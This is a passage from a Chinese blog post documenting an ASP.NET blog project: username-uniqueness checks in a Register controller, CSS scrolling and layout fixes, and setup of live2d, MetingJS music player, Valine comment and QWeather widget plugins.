权限维持(使用Cookie)"></a>2. 权限维持(使用Cookie)</h3><p>先创建一个全局的cookie，然后这里我准备给这个全局的cookie命名为</p><h2 id="六、注册用户名唯一"><a href="#六、注册用户名唯一" class="headerlink" title="六、注册用户名唯一"></a>六、注册用户名唯一</h2><p>这个的逻辑跟上面的login的密码判断的逻辑是相似的，所以代码我直接copy出来了，稍加改动即可。</p><p>Controller</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">HttpPost</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> ActionResult <span class="title">Register</span>(<span class="params">[Bind(Include = <span class="string">&quot;username,password,email&quot;</span></span>)] userinfo userinfo)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (ModelState.IsValid)</span><br><span class="line">    &#123;</span><br><span class="line">        userinfo.Id = db.userinfo.Count();</span><br><span class="line">        <span class="comment">//验证username的唯一性，如果username已存在则不给添加</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> name <span class="keyword">in</span> db.userinfo.Where(user =&gt; user.username == userinfo.username))</span><br><span class="line">        &#123;</span><br><span class="line">            ViewBag.IsRegistered = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> View(userinfo);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        db.userinfo.Add(userinfo);</span><br><span class="line">        db.SaveChanges();</span><br><span class="line">        <span class="keyword">return</span> RedirectToAction(<span class="string">&quot;Login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> View(userinfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Register.cshtml</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&quot;.alert&quot;</span>).<span class="title function_">ready</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&quot;.alert&quot;</span>).<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="number">3000</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> timeVal = <span class="number">3</span>;</span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&quot;small&quot;</span>).<span class="title function_">ready</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&quot;small&quot;</span>).<span class="title function_">text</span>(--timeVal + <span class="string">&quot; 秒后消失&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (timeVal &lt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">clearInterval</span>(timer);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@&#123;</span><br><span class="line">    if (ViewBag.IsRegistered != null)</span><br><span class="line">    &#123;</span><br><span class="line">        if (ViewBag.IsRegistered)</span><br><span class="line">        &#123;</span><br><span class="line">            ViewBag.IsRegistered = false;</span><br><span class="line">            <span class="comment">&lt;!--用户名已存在--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-danger&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center; margin-bottom: -74.4667px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;toast-header&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">strong</span> <span class="attr">class</span>=<span class="string">&quot;mr-auto text-primary&quot;</span>&gt;</span>注册失败<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>3 秒后消失<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ml-2 mb-1 close&quot;</span> <span class="attr">data-dismiss</span>=<span class="string">&quot;alert&quot;</span>&gt;</span>×<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;toast-body&quot;</span>&gt;</span></span><br><span class="line">                    用户名已存在，请修改你的用户名</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="七、文章保存"><a href="#七、文章保存" class="headerlink" title="七、文章保存"></a>七、文章保存</h2><p>​之所以把这个内容放在注册登录之后是因为开始的时候我也没想好把这个写好的博客文件保存在哪里合适，我想我这个博客显示的参数传的应该可以是文章号，即把文章转换生成的html单独放在一个文件夹之中</p><h2 id="八、前端问题及解决方案"><a href="#八、前端问题及解决方案" class="headerlink" title="八、前端问题及解决方案"></a>八、前端问题及解决方案</h2><h3 id="1-设置div单独滚动"><a href="#1-设置div单独滚动" class="headerlink" title="1.设置div单独滚动"></a>1.设置div单独滚动</h3><blockquote><p><a href="https://blog.csdn.net/qq_38353578/article/details/70596496">可滑动的窗口的内部Div可独立滑动，并将内部Div滑动条隐藏</a></p><p><a href="https://www.cnblogs.com/muzimumu/p/11156113.html">css 给div添加滚动并隐藏滚动条,或修改滚动条轨道颜色</a>]</p></blockquote><p>将想设置单独滚动的div盒子的样式表添加下面的两个attr，<strong>注意必须要设置高度固定</strong>，亲测有效</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">overflow-y</span>:scroll;</span><br><span class="line"><span class="attribute">overflow-x</span>: hidden;</span><br><span class="line"><span class="attribute">height</span>:<span class="number">100%</span>;</span><br><span class="line"><span class="attribute">scrollbar-width</span>: none; <span class="comment">/*隐藏滚动条，兼容火狐浏览器*/</span></span><br><span class="line"></span><br><span class="line">&#123;css选择器&#125;::-webkit-scrollbar &#123;</span><br><span class="line"><span class="attribute">display</span>: none;<span class="comment">/*隐藏滚动条*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211201001531238.png"></p><h3 id="2-双栏内容设置左侧固定的解决方案"><a href="#2-双栏内容设置左侧固定的解决方案" class="headerlink" title="2. 双栏内容设置左侧固定的解决方案"></a>2. 双栏内容设置左侧固定的解决方案</h3><p>​这个因为设置了<code>position:fixed;</code>之后，这个元素会自动定位到这个html的左上角似乎是，然后就需要重新考虑一下解决方案了，对于一般的双栏内容而言，只需要加一个相同宽高度的div填充他本来应该在的位置即可，就能把这个fixed的元素给顶出来了。</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211208153631633.png"></p><h4 id="找到了个更方便的"><a href="#找到了个更方便的" class="headerlink" title="找到了个更方便的"></a>找到了个更方便的</h4><p><a href="https://blog.csdn.net/weixin_43288153/article/details/107247272">参考文章链接</a></p><p>绝对定位之后可以使用<code>left top right bottom</code>几个属性进行定位，但这里一定要使用百分比定位，否则就会非常尴尬。</p><h3 id="3-简单方法添加live2d插件"><a href="#3-简单方法添加live2d插件" class="headerlink" title="3. 简单方法添加live2d插件"></a>3. 简单方法添加live2d插件</h3><p><a href="https://blog.csdn.net/weixin_40290074/article/details/104718917">参考文章链接</a></p><p><a href="https://github.com/stevenjoezhang/live2d-widget">使用工具链接</a></p><p>这里直接把他的源码下下来，放到你项目的static资源区：</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211209162426413.png"></p><p>然后哪里使用直接用下面这种方法导入即可：</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211209162219281.png"></p><p>但需要注意的是，在这句的上面还要加上个font-awesome的引用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--加入live2d看板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;~/static/live2d/autoload.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里我是直接使用的别人的api，当然他的模型也就是固定的了，等有时间的话可以自己做个api放进去。</p><h3 id="4-js音乐播放器插件的添加"><a href="#4-js音乐播放器插件的添加" class="headerlink" title="4. js音乐播放器插件的添加"></a>4. js音乐播放器插件的添加</h3><p>  准备在右上角的部分整一个音乐播放器插件，使用的是<code>基于Aplayer的Metingjs插件</code></p><blockquote><p><a href="https://github.com/metowolf/MetingJS">插件地址</a></p><p><a href="https://www.cnblogs.com/fby698/p/12663089.html">插件使用说明地址</a></p></blockquote><p>  简单使用的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- require APlayer --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- require MetingJS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meting-js</span> <span class="attr">server</span>=<span class="string">&quot;netease&quot;</span> <span class="attr">type</span>=<span class="string">&quot;playlist&quot;</span> <span class="attr">id</span>=<span class="string">&quot;60198&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">meting-js</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解析：server=&quot;netease&quot; type=&quot;playlist&quot; id=&quot;60198&quot;</span><br><span class="line"></span><br><span class="line">server指音乐平台，netease指网易云音乐， type类型，playlist列表，id指歌曲的i或者专辑或列表外链id</span><br><span class="line">因此重点在于指定平台，指定外链id</span><br></pre></td></tr></table></figure><p>  使用的时候我发现，它的这个插件的宽度是自适应父元素的。但是列表的最大高度需要自己调整，这里调整为了父元素的高度，效果如下图所示：</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211213140854873.png"></p><p>  我的配置代码如下所示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meting-js</span> <span class="attr">server</span>=<span class="string">&quot;netease&quot;</span> <span class="attr">type</span>=<span class="string">&quot;playlist&quot;</span> <span class="attr">id</span>=<span class="string">&quot;60198&quot;</span> <span class="attr">list-max-height</span>=<span class="string">&quot;300px&quot;</span> <span class="attr">list-folded</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">meting-js</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-无后端评论功能实现-Valine"><a href="#5-无后端评论功能实现-Valine" class="headerlink" title="5. 无后端评论功能实现(Valine)"></a>5. 无后端评论功能实现(Valine)</h3><blockquote><p><a href="https://valine.js.org/quickstart.html">官方文档地址</a></p></blockquote><p>  这个我准备在留言板模块来使用，但是似乎也是可以在普通的博客界面来使用，现在来写一下使用的方法，主要就是上面的这个引用的链接的使用方式。</p><h4 id="lt-1-gt-获取APP-ID-和-APP-Key"><a href="#lt-1-gt-获取APP-ID-和-APP-Key" class="headerlink" title="&lt;1&gt;获取APP ID 和 APP Key"></a>&lt;1&gt;获取APP ID 和 APP Key</h4><p><a href="https://console.leancloud.cn/">LeanCloud</a>注册登录。</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211215154302058.png"></p><p>创建应用(此版块非常容易找到，不再截图)</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211215154517469.png"></p><p>找到APPID和APPKEY</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211215154614968.png"></p><h4 id="lt-2-gt-直接就可以使用了"><a href="#lt-2-gt-直接就可以使用了" class="headerlink" title="&lt;2&gt;.直接就可以使用了"></a>&lt;2&gt;.直接就可以使用了</h4><p>​使用的是引入外部cdn资源的方式引入的这个Valine的模块，所以说非常方便，省得自己再配置了，下面是直接使用的代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    ..</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;//unpkg.com/valine/dist/Valine.min.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;vcomments&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">new</span> <span class="title class_">Valine</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">el</span>: <span class="string">&#x27;#vcomments&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">appId</span>: <span class="string">&#x27;Your appId&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">appKey</span>: <span class="string">&#x27;Your appKey&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211215155341562.png"></p><p>​我使用起来的效果就是上面的这样，我的代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;//unpkg.com/valine/dist/Valine.min.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;vcomments&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Valine</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#vcomments&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">appId</span>: <span class="string">&#x27;你的id&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">appKey</span>: <span class="string">&#x27;你的key&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​使用此种方法同样可以在博客详情界面来整这个评论模块。</p><h3 id="6-Valine添加bilibili表情包"><a href="#6-Valine添加bilibili表情包" class="headerlink" title="6. Valine添加bilibili表情包"></a>6. Valine添加bilibili表情包</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Valine</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#vcomment&#x27;</span>,</span><br><span class="line">    <span class="attr">appId</span>:<span class="string">&#x27;&lt;Your_APP_ID&gt;&#x27;</span>,</span><br><span class="line">    <span class="attr">appKey</span>:<span class="string">&#x27;&lt;Your_APP_KEY&gt;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置Bilibili表情包地址</span></span><br><span class="line">    <span class="attr">emojiCDN</span>: <span class="string">&#x27;//i0.hdslb.com/bfs/emote/&#x27;</span>, </span><br><span class="line">    <span class="comment">// 表情title和图片映射</span></span><br><span class="line">    <span class="attr">emojiMaps</span>: &#123;</span><br><span class="line">        <span class="string">&quot;tv_doge&quot;</span>: <span class="string">&quot;6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_亲亲&quot;</span>: <span class="string">&quot;a8111ad55953ef5e3be3327ef94eb4a39d535d06.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_偷笑&quot;</span>: <span class="string">&quot;bb690d4107620f1c15cff29509db529a73aee261.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_再见&quot;</span>: <span class="string">&quot;180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_冷漠&quot;</span>: <span class="string">&quot;b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_发怒&quot;</span>: <span class="string">&quot;34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_发财&quot;</span>: <span class="string">&quot;34db290afd2963723c6eb3c4560667db7253a21a.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_可爱&quot;</span>: <span class="string">&quot;9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_吐血&quot;</span>: <span class="string">&quot;09dd16a7aa59b77baa1155d47484409624470c77.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_呆&quot;</span>: <span class="string">&quot;fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_呕吐&quot;</span>: <span class="string">&quot;9f996894a39e282ccf5e66856af49483f81870f3.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_困&quot;</span>: <span class="string">&quot;241ee304e44c0af029adceb294399391e4737ef2.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_坏笑&quot;</span>: <span class="string">&quot;1f0b87f731a671079842116e0991c91c2c88645a.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_大佬&quot;</span>: <span class="string">&quot;093c1e2c490161aca397afc45573c877cdead616.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_大哭&quot;</span>: <span class="string">&quot;23269aeb35f99daee28dda129676f6e9ea87934f.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_委屈&quot;</span>: <span class="string">&quot;d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_害羞&quot;</span>: <span class="string">&quot;a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_尴尬&quot;</span>: <span class="string">&quot;7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_微笑&quot;</span>: <span class="string">&quot;70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_思考&quot;</span>: <span class="string">&quot;90cf159733e558137ed20aa04d09964436f618a1.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tv_惊吓&quot;</span>: <span class="string">&quot;0d15c7e2ee58e935adc6a7193ee042388adc22af.png&quot;</span>,</span><br><span class="line">        <span class="comment">// ... 更多表情</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="7-添加天气插件"><a href="#7-添加天气插件" class="headerlink" title="7. 添加天气插件"></a>7. 添加天气插件</h3><h4 id="lt-1-gt-第一种比较大的js插件"><a href="#lt-1-gt-第一种比较大的js插件" class="headerlink" title="&lt;1&gt;. 第一种比较大的js插件"></a>&lt;1&gt;. 第一种比较大的js插件</h4><blockquote><p><a href="https://widget.qweather.com/create-standard/#name-box">和风天气插件</a></p></blockquote><p>​这个使用相对简单，可以直接免登录生成代码，直接使用</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211215214548829.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;he-plugin-standard&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable constant_">WIDGET</span> = &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="string">&quot;CONFIG&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;layout&quot;</span>: <span class="string">&quot;1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;width&quot;</span>: <span class="string">&quot;300&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;height&quot;</span>: <span class="string">&quot;120&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;background&quot;</span>: <span class="string">&quot;1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;dataColor&quot;</span>: <span class="string">&quot;FFFFFF&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;borderRadius&quot;</span>: <span class="string">&quot;20&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;modules&quot;</span>: <span class="string">&quot;10&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;d20a76ef84c646acae0b93c6350c6c82&quot;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span 